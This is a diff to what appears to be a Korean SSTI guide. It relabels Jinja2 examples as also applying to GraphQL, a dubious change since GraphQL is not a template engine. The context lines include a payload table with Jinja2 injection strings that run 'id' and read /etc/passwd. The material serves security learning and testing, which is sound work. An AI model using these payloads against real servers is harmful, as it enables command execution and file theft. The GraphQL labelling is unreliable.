@@ -21,7 +21,7 @@ URL 파라미터(특히 OAuth redirect 등)가 직접 템플릿에 삽입되는 
 
 ##### 예시:
 
-* **Jinja2**: `{{ user.name }}`
+* **Jinja2**, **GraphQL**: `{{ user.name }}`
 * **Velocity**: `#set($user = "admin")`
 * **Freemarker**: `<#assign user="admin">`
 * **Thymeleaf**: `th:text="${user.name}"`
@@ -127,7 +127,7 @@ URL 파라미터(특히 OAuth redirect 등)가 직접 템플릿에 삽입되는 
 
 | **공격 유형**             | **페이로드**                                                                                                                             |                                                |   |
 | --------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------- | - |
-| **SSTI (Jinja2)**     | `{{ config }}`                                                                                                                       |                                                |   |
+| **SSTI (Jinja2&GraphQL)**     | `{{ config }}`                                                                                                                       |                                                |   |
 |                       | `{{ self.__class__.__mro__[1].__subclasses__()[59]("id") }}`                                                                         |                                                |   |
 |                       | `{{ ''.__class__.__mro__[1].__subclasses__()[59]("cat /etc/passwd") }}`                                                              |                                                |   |
 |                       | `{{ 7 * 7 }}`                                                                                                                        |                                                |   |
